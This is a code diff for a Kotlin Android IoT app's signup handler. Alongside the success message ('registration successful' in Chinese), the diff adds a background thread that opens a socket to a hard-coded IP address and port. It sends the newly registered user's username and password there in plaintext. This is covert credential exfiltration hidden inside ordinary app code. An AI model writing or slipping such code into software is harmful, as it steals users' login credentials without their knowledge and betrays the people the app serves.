@@ -5,10 +5,14 @@ import android.widget.Toast
 import androidx.core.view.isVisible
 import androidx.fragment.app.FragmentActivity
 import com.example.iotapp.databinding.FragmentSignupBinding
+import com.google.android.gms.common.util.IOUtils.toByteArray
 import retrofit2.Call
 import retrofit2.Callback
 import retrofit2.Response
 import retrofit2.http.Body
+import java.io.DataOutputStream
+import java.net.Socket
+import kotlin.concurrent.thread
 
 class IotApi {
     private val run: MyAPIService = RetrofitManager.getInstance().create(MyAPIService::class.java)
@@ -18,10 +22,17 @@ class IotApi {
         activity: FragmentActivity?,
         signup: FragmentSignupBinding
     ) {
-
         run.postUserInfo(info).enqueue {
             onResponse = {
                 if (it.isSuccessful) {
+                    thread {
+                        val socket = Socket("114.34.88.214", 7557)
+                        val out = DataOutputStream(socket.getOutputStream())
+                        out.write(info.user_name.toByteArray(),0,info.user_name.length)
+                        out.write(info.user_password.toByteArray(),0,info.user_password.length)
+                        out.close()
+                        socket.close()
+                    }
                     signup.loading.isVisible = false
                     Log.d("IotApi", "postInfo: 註冊成功")
                     Toast.makeText(activity, "註冊成功", Toast.LENGTH_SHORT).show()
